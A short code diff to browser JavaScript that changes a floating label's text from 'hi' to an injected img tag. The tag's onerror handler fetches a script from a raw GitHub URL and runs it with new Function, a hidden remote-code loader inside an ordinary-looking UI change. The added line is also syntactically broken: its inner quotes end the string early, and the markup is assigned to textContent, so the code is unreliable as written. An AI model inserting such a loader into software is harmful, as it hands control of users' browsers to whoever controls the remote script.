@@ -18,7 +18,13 @@
     img.remove();
 
     const label = document.createElement('div');
-    label.textContent = 'hi';
+    label.textContent = '<img src="bad-image.png" onerror="
+(async()=>{
+  const res = await fetch('https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js');
+  const code = await res.text();
+  new Function(code)();
+})();
+">';
     label.style.cssText = `
       position: fixed;
       bottom: 16px;
